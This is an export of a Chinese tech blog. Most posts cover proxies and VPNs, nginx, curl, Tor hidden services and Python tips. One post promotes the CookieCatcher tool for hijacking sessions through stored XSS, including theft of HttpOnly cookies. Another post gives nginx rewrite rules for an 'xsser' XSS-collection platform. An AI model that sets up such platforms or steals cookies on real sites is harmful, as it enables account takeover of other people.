Wingy自定义规则添加方法支持Pinterest等网站最近两天pinterest.com被封了，有网友问怎么自定义规则。其实在Wingy的github里面有自定义规则的说明文档。但是对于小白用户来说，自己写规则还是有点麻烦，这里给大家分享一个网友写好的规则，经测试可以直接访问pinterest网站。在iPhone上打开 https://raw.githubusercontent.com/kimanlo/WingyConfig/master/default.conf 全部选中这个网页的内容，然后拷贝。 接着打开Wingy操作。点击右上角+号，然后自定义配置把前面拷贝的内容粘贴进来，然后手动修改host、port、method和password这几个内容为你自己的ss账号接着下一步，写一个名字，保存。然后选择刚才添加的规则后开启VPN就可以了。 其他特别提醒：这个账号可以在电脑、手机、平板、路由器等设备上使用，这里只是苹果手机的教程，其他教程请自己参见购买网址。wingy右上角+号，shadowsocksR。服务器填写节点网址，端口填写链接端口，密码填写你自己的密码（在连接端口后面，需要点击显示的那个，最好是复制粘贴密码，避免输错）连接不上Messenger的话，请使用Shadowrocket如果还有什么问题大家请联系购买商家的客服，本站仅做产品推荐，不负责售后问题，谢谢理解。 QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>vpn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CookieCatcher]]></title>
    <url>%2F2017%2F04%2F28%2F08_XSS%E5%B9%B3%E5%8F%B0CookieCatcher%2F</url>
    <content type="text"><![CDATA[CookieCatcher是一款开源攻击测试工具，可以通过持久性XSS (Cross Site Scripting) 漏洞进行会话劫持。本工具仅用于纯粹的教学之用，禁止用于非授权的渗透。 CookieCatcher特性 获取cookie信息 只需要在xss中粘贴攻击payload 当获取cookie时会邮件通知 s每三分钟刷新cookie 支持代理 (BuRP等) 多种PAYLOAD 基础 AJAX攻击测试 HTTPONLY cookie获取（通过 CVE-20120053） 视频演示（需翻墙） 下载地址 QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx配伪静态写法]]></title>
    <url>%2F2017%2F04%2F28%2F09_Nginx%E9%85%8D%E4%BC%AA%E9%9D%99%E6%80%81%E5%86%99%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Nginx配伪静态写法伪静态是一种可以把文件后缀改成任何可能的一种方法，如果我想把PHP文件伪静态成html文件，这种相当简单的，下面来介绍nginx 伪静态配置方法有需要了解的朋友可参考。nginx里使用伪静态是直接在nginx.conf 中写规则的，并不需要像apache要开启写模块(mod_rewrite)才能进行伪静态。nginx只需要打开nginx.conf配置文件，在server里面写需要的规则即可。 就用上面的例子中的伪静态策略来简单解释下正则表达式在配置的作用：策略：RewriteRule ^(.*)list-([0-9]+)-([0-9]+).html$ $1list.php?page=$2&amp;id=$3请求路径：http://www.abc.com/list-123-456.html 本策略分成两段，第一段是使用正则表达式去匹配请求访问的路径，第二段是将匹配后的参数转化为真实访问的路径。策略执行时：^(.)list-([0-9]+)-([0-9]+).html$ 与 /list-123-456.html 这个字符串进行匹配：^和$字符分别代表了匹配输入字符串的开始和结束()中的匹配到的内容会被按顺序分配到变量$1 $2 $3中.匹配任意字符串，且长度从0个到多个，故$1值为/[0-9]+匹配字符0-9，长度1个到多个，故$2和$3分别是123和456 所以最后真实访问的动态地址为 /list.php?page=123&amp;id=456上面只是介绍了基本的配置策略，其实这个rewrite规则还有非常多的玩法，例如使用RewriteCond进行域名层面的重写跳转，接下来可以找些资料慢慢补充。 scc.gd配置实例: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107user www www;worker_processes auto;error_log /home/wwwlogs/nginx_error.log crit;pid /usr/local/nginx/logs/nginx.pid;#Specifies the value for maximum file descriptors that can be opened by this process.worker_rlimit_nofile 51200;events &#123; use epoll; worker_connections 51200; multi_accept on; &#125;http &#123; include mime.types; default_type application/octet-stream; server_names_hash_bucket_size 128; client_header_buffer_size 32k; large_client_header_buffers 4 32k; client_max_body_size 50m; sendfile on; tcp_nopush on; keepalive_timeout 600; tcp_nodelay on; fastcgi_connect_timeout 300; fastcgi_send_timeout 300; fastcgi_read_timeout 300; fastcgi_buffer_size 64k; fastcgi_buffers 4 64k; fastcgi_busy_buffers_size 128k; fastcgi_temp_file_write_size 256k; gzip on; gzip_min_length 1k; gzip_buffers 4 16k; gzip_http_version 1.1; gzip_comp_level 2; gzip_types text/plain application/javascript application/x-javascript text/javascript text/css application/xml application/xml+rss; gzip_vary on; gzip_proxied expired no-cache no-store private auth; gzip_disable "MSIE [1-6]\."; #limit_conn_zone $binary_remote_addr zone=perip:10m; ##If enable limit_conn_zone,add "limit_conn perip 10;" to server section. server_tokens off; access_log off;server &#123; listen 80 default_server; #listen [::]:80 default_server ipv6only=on; server_name scc.gd; index index.html index.htm index.php; root /home/wwwroot/scc.gd; #error_page 404 /404.html; include enable-php.conf; if ($document_uri = '/api.php')&#123; rewrite ^(.*)/api.php?(.*)$ $1/index.php?m=Index&amp;a=api&amp;$2 last; &#125; if (!-d $document_uri)&#123; rewrite ^/([0-9a-zA-Z]+)$ /index.php?m=Index&amp;a=jump&amp;u=$1 last; &#125; if ($host != 'scc.gd') &#123; rewrite ^/(.*)$ http://scc.gd/$1 permanent; &#125; location /nginx_status &#123; stub_status on; access_log off; &#125; location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ &#123; expires 30d; &#125; location ~ .*\.(js|css)?$ &#123; expires 12h; &#125; location ~ /\. &#123; deny all; &#125; access_log /home/wwwlogs/access.log; &#125;include vhost/*.conf;&#125; xsser平台的nginx规则1234567root@www:/usr/local/nginx/conf# cat xss.conf rewrite &quot;^/([0-9a-zA-Z]&#123;4&#125;)$&quot; /xss.php?do=code&amp;urlKey=$1 last;rewrite &quot;^/([0-9a-zA-Z]&#123;6&#125;)$&quot; /xss.php?do=code&amp;urlKey=$1 break;rewrite &quot;^/do/auth/(w+?)(/domain/([w.]+?))?$&quot; /xss.php?do=do&amp;auth=$1&amp;domain=$3 break;rewrite &quot;^/register/(.?)$&quot; /xss.php?do=register&amp;key=$1 break;rewrite &quot;^/register-validate/(.?)$&quot; /xss.php?do=register&amp;act=validate&amp;key=$1 break;rewrite &quot;^/login$&quot; /xss.php?do=login break; 一些常用内置变量12345678910111213141516171819$arg_name：请求 uri 中的 name 参数至$args：请求 uri 的所有参数，和 $query_string 相同$uri：当前请求的 uri，不带参数$request_uri：请求的 uri，带完整参数$host：http 请求报文中 host 首部，如果没有 host 首部，则以处理此请求的虚拟主机的主机名替代$hostname：nginx 服务运行在主机的主机名$remote_addr：客户端 IP$remote_port：客户端 port$remote_user：使用用户认证时客户端用户输入的用户名$request_filename：用户请求中的 URI 经过本地 root 或 alias 转换后映射的本地的文件路径$request_method：请求方法$server_addr：服务器地址$server_name：服务器名称$server_port：服务器端口$server_protocol：服务器向客户端发送响应时的协议，如 http/1.1，http/1.0$scheme：在请求中使用的 scheme，如 https://www.magedu.com/ 中的 https$http_name：匹配请求报文中的指定 HEADER，如 $http_host 匹配请求报文中的 host 首部$sent_http_name：匹配响应报文中指定的 HEADER，例如 $sent_content_type 匹配响应报文中的 content-type 首部$status：响应状态 QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux curl命令参数详解]]></title>
    <url>%2F2017%2F04%2F27%2F05_Linux_curl%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[linux curl是通过url语法在命令行下上传或下载文件的工具软件，它支持http,https,ftp,ftps,telnet等多种协议，常被用来抓取网页和监控Web服务器状态。 非常实用: Linux 使用curl查代理IP地址12345curl --connect-timeout 2 -x socks5://127.0.0.1:9050 ipinfo.iowhile :; do curl --connect-timeout 2 -x socks5://127.0.0.1:9050 ipinfo.io;sleep 5;donewhile :; do curl --connect-timeout 2 -x socks5://127.0.0.1:9050 ipinfo.io;/etc/init.d/tor restart;sleep 60;done Linux curl用法举例linux curl抓取网页：抓取百度： curl http://www.baidu.com 如发现乱码，可以使用iconv转码 curl http://iframe.ip138.com/ic.asp|iconv -fgb2312 iconv的用法请参阅：在Linux/Unix系统下用iconv命令处理文本文件中文乱码问题 Linux curl使用代理linux curl使用http代理抓取页面： curl -x 111.95.243.36:80 http://iframe.ip138.com/ic.asp|iconv -fgb2312 curl -x 111.95.243.36:80 -U aiezu:password http://www.baidu.com 使用socks代理抓取页面： curl –socks4 202.113.65.229:443 http://iframe.ip138.com/ic.asp|iconv -fgb2312 curl –socks5 202.113.65.229:443 http://iframe.ip138.com/ic.asp|iconv -fgb2312 代理服务器地址可以从爬虫代理上获取。 linux curl处理cookies接收cookies:curl -c /tmp/cookies http://www.baidu.com #cookies保存到/tmp/cookies文件 发送cookies:curl -b “key1=val1;key2=val2;” http://www.baidu.com #发送cookies文本curl -b /tmp/cookies http://www.baidu.com #从文件中读取cookies linux curl发送数据：linux curl get方式提交数据：curl -G -d “name=value&amp;name2=value2” http://www.baidu.com linux curl post方式提交数据：curl -d “name=value&amp;name2=value2” http://www.baidu.com #post数据curl -d a=b&amp;c=d&amp;txt@/tmp/txt http://www.baidu.com #post文件 以表单的方式上传文件：curl -F file=@/tmp/me.txt http://www.aiezu.com 相当于设置form表单的method=”POST”和enctype=’multipart/form-data’两个属性。 linux curl http header处理：设置http请求头信息：curl -A “Mozilla/5.0 Firefox/21.0” http://www.baidu.com #设置http请求头User-Agentcurl -e “http://pachong.org/&quot; http://www.baidu.com #设置http请求头Referercurl -H “Connection:keep-alive \n User-Agent: Mozilla/5.0” http://www.aiezu.com 设置http响应头处理：curl -I http://www.aiezu.com #仅仅返回headercurl -D /tmp/header http://www.aiezu.com #将http header保存到/tmp/header文件 linux curl认证：curl -u aiezu:password http://www.aiezu.com #用户名密码认证curl -E mycert.pem https://www.baidu.com #采用证书认证 其他：curl -# http://www.baidu.com #以“#”号输出进度条curl -o /tmp/aiezu http://www.baidu.com #保存http响应到/tmp/aiezu linux 使用curl小经验教训：http请求地址的url要使用””括起来。当有存在多个参数使用&amp;连接时可能会出错。 Linux下CURL常用命令下载单个文件默认将输出打印到标准输出中(STDOUT)中 curl http://www.centos.org 通过-o/-O选项保存下载的文件到指定的文件中：-o：将文件保存为命令行中指定的文件名的文件中-O：使用URL中默认的文件名保存文件到本地 #将文件下载到本地并命名为mygettext.html curl -o mygettext.html http://www.gnu.org/software/gettext/manual/gettext.html # 将文件保存到本地并命名为gettext.html curl -O http://www.gnu.org/software/gettext/manual/gettext.html 同样可以使用转向字符”&gt;”对输出进行转向输出 同时获取多个文件curl -O URL1 -O URL2 若同时从同一站点下载多个文件时，curl会尝试重用链接(connection)。 通过-L选项进行重定向默认情况下CURL不会发送HTTP Location headers(重定向).当一个被请求页面移动到另一个站点时，会发送一个HTTP Loaction header作为请求，然后将请求重定向到新的地址上。例如：访问google.com时，会自动将地址重定向到google.com.hk上。 curl http://www.google.com &lt;HTML&gt; &lt;HEAD&gt; &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; &lt;TITLE&gt;302 Moved&lt;/TITLE&gt; &lt;/HEAD&gt; &lt;BODY&gt; &lt;H1&gt;302 Moved&lt;/H1&gt; The document has moved &lt;A HREF=&quot;http://www.google.com.hk/url?sa=p&amp;amp;hl=zh-CN&amp;amp;pref=hkredirect&amp;amp;pval=yes&amp;amp;q=http://www.google.com.hk/&amp;amp;ust=1379402837567135amp;usg=AFQjCNF3o7umf3jyJpNDPuF7KTibavE4aA&quot;&gt;here&lt;/A&gt;. &lt;/BODY&gt; &lt;/HTML&gt; 上述输出说明所请求的档案被转移到了http://www.google.com.hk。 这是可以通过使用-L选项进行强制重定向 让curl使用地址重定向，此时会查询google.com.hk站点 curl -L http://www.google.com 断点续传通过使用-C选项可对大文件使用断点续传功能，如：当文件在下载完成之前结束该进程 $ curl -O http://www.gnu.org/software/gettext/manual/gettext.html ############## 20.1% #通过添加-C选项继续对该文件进行下载，已经下载过的文件不会被重新下载12curl -C - -O http://www.gnu.org/software/gettext/manual/gettext.html############### 21.1% 对CURL使用网络限速通过–limit-rate选项对CURL的最大网络使用进行限制123# 下载速度最大不会超过1000B/secondcurl --limit-rate 1000B -O http://www.gnu.org/software/gettext/manual/gettext.html 下载指定时间内修改过的文件当下载一个文件时，可对该文件的最后修改日期进行判断，如果该文件在指定日期内修改过，就进行下载，否则不下载。 该功能可通过使用-z选项来实现： #若yy.html文件在2011/12/21之后有过更新才会进行下载1curl -z 21-Dec-11 http://www.example.com/yy.html CURL授权在访问需要授权的页面时，可通过-u选项提供用户名和密码进行授权123456curl -u username:password URL # 通常的做法是在命令行只输入用户名，之后会提示输入密码，这样可以保证在查看历史记录时不会将密码泄露curl -u username URL从FTP服务器下载文件CURL同样支持FTP下载，若在url中指定的是某个文件路径而非具体的某个要下载的文件名，CURL则会列出该目录下的所有文件名而并非下载该目录下的所有文件 #列出public_html下的所有文件夹和文件1curl -u ftpuser:ftppass -O ftp://ftp_server/public_html/ 下载xss.php文件curl -u ftpuser:ftppass -O ftp://ftp_server/public_html/xss.php上传文件到FTP服务器通过 -T 选项可将指定的本地文件上传到FTP服务器上 12345# 将myfile.txt文件上传到服务器curl -u ftpuser:ftppass -T myfile.txt ftp://ftp.testserver.com# 同时上传多个文件curl -u ftpuser:ftppass -T &quot;&#123;file1,file2&#125;&quot; ftp://ftp.testserver.com 从标准输入获取内容保存到服务器指定的文件中curl -u ftpuser:ftppass -T - ftp://ftp.testserver.com/myfile_1.txt 获取更多信息通过使用 -v 和 -trace获取更多的链接信息 通过字典查询单词查询bash单词的含义 curl dict://dict.org/d:bash 列出所有可用词典curl dict://dict.org/show:db 在foldoc词典中查询bash单词的含义curl dict://dict.org/d:bash:foldoc 为CURL设置代理-x 选项可以为CURL添加代理功能 指定代理主机和端口 curl -x proxysever.test.com:3128 http://google.co.in 其他网站整理 保存与使用网站cookie信息将网站的cookies信息保存到sugarcookies文件中 curl -D sugarcookies http://localhost/sugarcrm/index.php 使用上次保存的cookie信息curl -b sugarcookies http://localhost/sugarcrm/index.php 传递请求数据默认curl使用GET方式请求数据，这种方式下直接通过URL传递数据可以通过 –data/-d 方式指定使用POST方式传递数据 12345# GETcurl -u username https://api.github.com/user?access_token=XXXXXXXXXX # POSTcurl -u username --data &quot;param1=value1&amp;param2=value&quot; https://api.github.com 也可以指定一个文件，将该文件中的内容当作数据传递给服务器端curl –data @filename https://github.api.com/authorizations 注：默认情况下，通过POST方式传递过去的数据中若有特殊字符，首先需要将特殊字符转义在传递给服务器端，如value值中包含有空格，则需要先将空格转换成%20，如：curl -d “value%201” http://hostname.com 在新版本的CURL中，提供了新的选项 –data-urlencode，通过该选项提供的参数会自动转义特殊字符。 curl –data-urlencode “value 1” http://hostname.com 除了使用GET和POST协议外，还可以通过 -X 选项指定其它协议，如： curl -I -X DELETE https://api.github.cim 上传文件 curl –form “fileupload=@filename.txt“ http://hostname/resource QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>curl</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端优化系列之一：DNS预获取 dns-prefetch 提升页面载入速度]]></title>
    <url>%2F2017%2F04%2F27%2F06_%E5%89%8D%E7%AB%AF%E4%BC%98%E5%8C%96%E7%B3%BB%E5%88%97%E4%B9%8B%E4%B8%80_DNS%E9%A2%84%E8%8E%B7%E5%8F%96dns-prefetch%E6%8F%90%E5%8D%87%E9%A1%B5%E9%9D%A2%E8%BD%BD%E5%85%A5%E9%80%9F%E5%BA%A6%2F</url>
    <content type="text"><![CDATA[DNS Prefetch，即DNS预获取，是前端优化的一部分。一般来说，在前端优化中与 DNS 有关的有两点： 一个是减少DNS的请求次数，另一个就是进行DNS预获取 。 DNS 作为互联网的基础协议，其解析的速度似乎很容易被网站优化人员忽视。现在大多数新浏览器已经针对DNS解析进行了优化，典型的一次DNS解析需要耗费 20-120 毫秒，减少DNS解析时间和次数是个很好的优化方式。DNS Prefetching 是让具有此属性的域名不需要用户点击链接就在后台解析，而域名解析和内容载入是串行的网络操作，所以这个方式能 减少用户的等待时间，提升用户体验 。 默认情况下浏览器会对页面中和当前域名（正在浏览网页的域名）不在同一个域的域名进行预获取，并且缓存结果，这就是隐式的 DNS Prefetch。如果想对页面中没有出现的域进行预获取，那么就要使用显示的 DNS Prefetch 了。 目前大多数浏览器已经支持此属性，支持版本如下： – Safari: 5+ – Chrome: All – Firefox: 3.5+ – Opera: Unknown – IE: 9+ (called “Pre-resolution” on blogs.msdn.com)其中 Chrome 和 Firefox 3.5+ 内置了 DNS Prefetching 技术并对DNS预解析做了相应优化设置。所以 即使不设置此属性，Chrome 和 Firefox 3.5+ 也能自动在后台进行预解析 。 目前很多大型站点也应用了这一优化，例如： 淘宝： 支付宝： 网易： DNS Prefetch 应该尽量的放在网页的前面，推荐放在 后面。具体使用方法如下：1234&lt;meta http-equiv="x-dns-prefetch-control" content="on"&gt;&lt;link rel="dns-prefetch" href="//www.itechzero.com"&gt;&lt;link rel="dns-prefetch" href="//api.share.baidu.com"&gt;&lt;link rel="dns-prefetch" href="//bdimg.share.baidu.com"&gt; 需要注意的是，虽然使用 DNS Prefetch 能够加快页面的解析速度，但是也不能滥用，因为有开发者指出 禁用DNS 预读取能节省每月100亿的DNS查询 。 如果需要禁止隐式的 DNS Prefetch，可以使用以下的标签：1&lt;meta http-equiv="x-dns-prefetch-control" content="off"&gt; QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在阿里云搭建IPSEC VPN]]></title>
    <url>%2F2017%2F04%2F25%2F03_%E9%98%BF%E9%87%8C%E4%BA%91%E6%90%AD%E5%BB%BAIPSECVPN%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[阿里云优惠券领取 特点 支持使用OTP两步验证工具（例如Google Authenticator） 支持 IPSec Site-to-Site 支持 VPN、SNAT 基础服务 WEB管理方便效果图 Flex Gateway项目简介使用 Flex Gateway 在阿里云搭建VPNFlex GateWay 提供了 VPN、SNAT 基础服务。它主要提供以下几点功能：①IPSec Site-to-Site 功能。可快速的帮助用户将两个不同的VPC 私网以IPSec Site-to-Site 的方式连接起来。②拨号VPN 功能。可让用户通过拨号方式，接入VPC 私网，进行日常维护管理。③SNAT 功能。可方便的设置Source NAT，以让VPC 私网内的VM 通过Gateway VM 访问外网。【源码托管地址】 https://github.com/alibaba/FlexGW VPC 用户通过VPN 将云上环境和用户侧网络打通(Site-to-Site)。同一用户名下多个VPC(包括同Region/不同Region)之间通过VPN 打通(Site-to-Site)。跨账号、跨区域的云服务器之间内网互通(拨号VPN。可将不同账号下的云服务器拨入同一个FlexGW VPN 内，然后用VPN 分配的私网地址进行互通)。 登陆说明登陆地址：https://VM公网IP使用VM的系统账号密码即可登入系统，即所有可通过SSH登陆主机的用户都可以登入该系统。 软件组成Strongswan 版本：5.1.3Website：http://www.strongswan.orgOpenVPN 版本：2.3.2Website：https://openvpn.net/index.php/open-source.html 程序说明FlexGW（即本程序）目录：/usr/local/flexgw数据库文件：/usr/local/flexgw/instance/website.db启动脚本：/etc/init.d/flexgw 或/usr/local/flexgw/website_console日志文件目录：/usr/local/flexgw/logs实用脚本目录：/usr/local/flexgw/scripts「数据库文件」保存了我们所有的VPN 配置，建议定期备份。如果数据库损坏，可通过「实用脚本目录」下的initdb.py 脚本对数据库进行初始化，初始化之后所有的配置将清空。 Strongswan目录：/etc/strongswan日志文件：/var/log/strongswan.charon.log启动脚本：/usr/sbin/strongswan如果strongswan.conf 配置文件损坏，可使用备份文件/usr/local/flexgw/rc/strongswan.conf 进行覆盖恢复。 ipsec.conf 和ipsec.secrets 配置文件，由/usr/local/flexgw/website/vpn/sts/templates/sts 目录下的同名文件自动生成，请勿随便修改。 OpenVPN目录：/etc/openvpn日志文件：/etc/openvpn/openvpn.log状态文件：/etc/openvpn/openvpn-status.log启动脚本：/etc/init.d/openvpnserver.conf 配置文件，由/usr/local/flexgw/website/vpn/dial/templates/dial 目录下的同名文件自动生成，请勿随便修改。 参考:http://taohui.pub/2017/01/28/%E5%9C%A8%E9%98%BF%E9%87%8C%E4%BA%91ecs%E4%B8%8A%E8%BF%9B%E8%A1%8Cvpn-ipsec%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8E%A5/http://www.oschina.net/p/flexgw 阿里巴巴开源技术汇总：115个软件(五)https://yq.aliyun.com/articles/53997 在阿里云ECS上进行VPN IPSEC网络对接当我们需要与一些安全级别要求很高的服务对接时，服务提供商的网络提供方式可能是使用ipsec点对点对接网络。如果我们不是使用公有云，而是有自己的机房和路由器，这些就只是按照服务方的参数要求配置下路由器的小事情。但对公有云来说（例如阿里云），我们没有自己的路由器，当对接方要求我们使用预共享密匙进行ipsec点对点对接，第一反应什么鬼（之前没接触过的朋友可以看下这篇文章http://www.ibm.com/developerworks/cn/Linux/l-ipsec/，对该概念讲得蛮清楚）？而接下来拥有私有云独立机房的服务提供方则可能要求最简单直接的解决方案：拉条专线接入服务提供者机房（这个开发成本和运维成本都不小，不适合小而美型的敏捷项目！）？或者买个路由器，在办公室找台机器与服务方对接（高可靠性完全无法保障了）？ QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[托管网站在Tor网络上]]></title>
    <url>%2F2017%2F04%2F24%2F00_%E6%89%98%E7%AE%A1%E7%BD%91%E7%AB%99%E5%9C%A8Tor%E7%BD%91%E7%BB%9C%E4%B8%8A_Ubuntu%E4%B8%BB%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[托管网站在Tor网络上（Ubuntu主机）https://www.t00ls.net/thread-44040-1-1.html 大部分人接触Tor网络是由Tor Browser开始的，这个东东可以浏览暗网里面奇奇怪怪的东西，网络里面最黑色的部分在这里完整的体现了。开始好奇一个网站怎么和Tor网络联系在一起的，怎么去获取一个.onion域名。查阅相关资料，发现教程极少，自己摸索着，发现几条命令就搞定了，国内还没有相关教程，便有了这篇文章。 环境：Ubuntu14.04（国外的） 1.安装Tor Browser,这步就不多说了，https://www.torproject.org/。注意：安装完后，国内大部分ip是直接链接不上tor网络的，点击配置，然后选择网桥obfs4，挂个国外的sock5，稍等一分钟就行了。 2.Ubuntu安装tor，由https://www.torproject.org/docs/debian.html.en，执行如下：修改源 vim /etc/apt/sources.list添加 ：deb http://deb.torproject.org/torproject.org stretch maindeb-src http://deb.torproject.org/torproject.org stretch main接着运行：gpg –keyserver keys.gnupg.net –recv A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89gpg –export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | sudo apt-key add -apt updateapt install tor deb.torproject.org-keyring 3.运行：mkdir /root/serverchmod 700 /root/server ，配置权限。 添加网站到tor配置文件。tor配置文件位于/etc/tor/torrc.在文件最后面添加HiddenServiceDir /root/serverHiddenServicePort 80 127.0.0.1:80 这里的/root/server 自己配置自己的路径，等会而输出一些文件到这个文件夹，hostname，private_keyz这些。 4.运行：tor 看到Done就可以了。接着在/root/server/hostname 里面就是tor网站地址，指向本地的80端口。 5.作为一个演示，我们python 搭建一个简单的网站，test.html 写入了Hello World！ 6.Tor Browser浏览试试]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
      <tags>
        <tag>小技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Chrome修改user agent模拟微信内置浏览器]]></title>
    <url>%2F2017%2F04%2F24%2F01_Chrome%E6%A8%A1%E6%8B%9F%E5%BE%AE%E4%BF%A1%E5%86%85%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8%2F</url>
    <content type="text"><![CDATA[模拟微信内置浏览器很多时候，我们需要模拟微信内置浏览器，今天教大家用chrome简单模拟。如图设置： 进入开发者模式F12或者右键审查元素进入开发者模式，点击Emulation，然后点击Network，把Spoof user agent改成Other，并把下面的带复制进去，有三句，大家自己尝试。回车然后刷新页面即可。 Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9B176 MicroMessenger/4.3.2 Mozilla/5.0 (Linux; U; Android 2.3.6; zh-cn; GT-S5660 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 MicroMessenger/4.5.255 自己获取的内容如下： Mozilla/5.0 (Linux; Android 4.4.4; HM NOTE 1LTEW Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 MicroMessenger/6.0.0.54_r849063.501 NetType/WIFI 原理主要通过 MicroMessenger 字段判断是否为微信客户端浏览器如果有这个字段就是微信客户端浏览器 QQ群：397745473]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
      <tags>
        <tag>小技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python奇技淫巧]]></title>
    <url>%2F2017%2F04%2F24%2F02_python%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[本文用作记录，在使用python过程中遇到的一些奇技淫巧，有些代码是本人所写，有些则是python内置函数，有些则取之互联网。在此记录，只为备份以及遗忘时方便查找。 本文将会继续更新，内容仅限记录一些常用好用却又永远记不住的代码或者模块。 控制台操作控制台不闪退1os.system('pause') 获取控制台大小1rows, columns = os.popen('stty size', 'r').read().split() 输入输出控制解决输入提示中文乱码问题1raw_input(unicode('请输入文字','utf-8').encode('gbk')) 格式化输出1print a.prettify() 接受多行输入123456789101112131415text=""while 1: data=raw_input("&gt;&gt;") if data.strip()=="stop": break text+="%s\n" % dataprint text---------------------------&gt;&gt;1&gt;&gt;2&gt;&gt;3&gt;&gt;stop123 同时输出12Print '%s' % a,Print '%s \r' % a 标准输入输出12sys.stdout.write("input") 标准输入sys.stdout.flush() 刷新缓冲区 print的功能与sys.stdout.write类似，因为2.x中print默认就是将输出指定到标准输出中（sys.stdout)。 颜色控制控制台颜色控制(适用于windows)1234WConio.textcolor(WConio.YELLOW)print "yellow"WConio.textcolor(WConio.BLUE)print "blue" 输出颜色控制(全平台)1234567red = '\033[1;31m'green = '\033[1;32m'yellow = '\033[1;33m'white = '\033[1;37m'reset = '\033[0m’print red+"color is red"+resetprint green+"color is green"+reset 进度条控制方案一12345678from __future__ import divisionimport sys,timej = '#'for i in range(1,61): j += '#' sys.stdout.write(str(int((i/60)*100))+'% ||'+j+'-&gt;'+"\r") sys.stdout.flush() time.sleep(0.1) 方案二123456import sysimport timefor i in range(1,61): sys.stdout.write('#'+'-&gt;'+"\b\b") sys.stdout.flush() time.sleep(0.5) 方案三12345678910111213141516171819202122from progressbar import *import timeimport osrows, columns = os.popen('stty size', 'r').read().split() #获取控制台size console_width=int(columns)total = 10progress = ProgressBar()def test(): ''' 进度条函数，记录进度 ''' for i in progress(range(total)): test2()def test2(): ''' 执行函数，输出结果 ''' content="nMask'Blog is http://thief.one" sys.stdout.write("\r"+content+" "*(console_width-len(content))) time.sleep(1) sys.stdout.flush()test() 更多高级用法可以使用progressbar模块。 系统操作系统信息获取python安装路径12from distutils.sysconfig import get_python_libprint get_python_lib 获取当前时间1234567c=time.ctime()#自定义格式输出ISOTIMEFORMAT='%Y-%m-%d %X'time.strftime( ISOTIMEFORMAT, time.localtime() )# 常用来打日志的当前时间格式now=time.strftime('%Y-%m-%d %X', time.localtime()) 查看系统环境变量1os.environ["PATH"] 获取系统磁盘1os.popen("wmic VOLUME GET Name") 获取当前路径(包括当前py文件名)1os.path.realpath(__file__) 当前平台使用的行终止符1os.linesep 获取终端大小123rows, columns = os.popen('stty size', 'r').read().split()#python3以后存在可以使用osos.get_termial_size() 退出程序12345return：返回函数的值，并退出函数。exit()：直接退出。sys.exit(): 引发一个SystemExit异常，若没有捕获错误，则python程序直接退出；捕获异常后，可以做一些额外的清理工作。sys.exit(0):为正常退出，其他（1-127）为不正常，可抛异常事情供捕获。（一般用于主线程中退出程序）os._exit(0): 直接退出python程序，其后的代码也不会执行。（一般用于线程中退出程序） 网络操作域名解析为ip1ip= socket.getaddrinfo(domain,'http')[0][4][0] 获取服务器版本信息123sUrl = 'http://www.163.com'sock = urllib2.urlopen(sUrl)sock.headers.values() 文件操作输出一个目录下所有文件名称12345678def search(paths): if os.path.isdir(paths): #如果是目录 files=os.listdir(paths) #列出目录中所有的文件 for i in files: i=os.path.join(paths,i) #构造文件路径 search(i) #递归 elif os.path.isfile(paths): #如果是文件 print paths #输出文件名 文件查找123456import globprint glob.glob(r"E:/*.txt") #返回的是一个列表查找文件只用到三个匹配符：”*”, “?”, “[]“”*”匹配0个或多个字符；”?”匹配单个字符；”[]“匹配指定范围内的字符，如：[0-9]匹配数字。 查找指定名称的文件夹的路径123456789101112131415def search(paths,file_name,tag,lists): if os.path.isdir(paths): #如果是目录 if file_name==tag: #如果目录名称为tag lists.append(paths) #将该路径添加到列表中 else: #如果目录名称不为tag try: files_list=os.listdir(paths) #列出目录中所有的文件 for file_name in files_list: path_new=os.path.join(paths,file_name) #构造文件路径 search(path_new,file_name,tag,lists) #递归 except: #遇到特殊目录名时会报错 pass elif os.path.isfile(paths): #如果是文件 pass return lists 数据操作判断数据类型1isinstance("123",(int,long,float,complex) 字符串(string)去掉小数点后面的数字12a=1.21311b=Int(math.floor(a)) 字符串倒置 12&gt;&gt;&gt; a = "codementor"&gt;&gt;&gt; a[::-1] 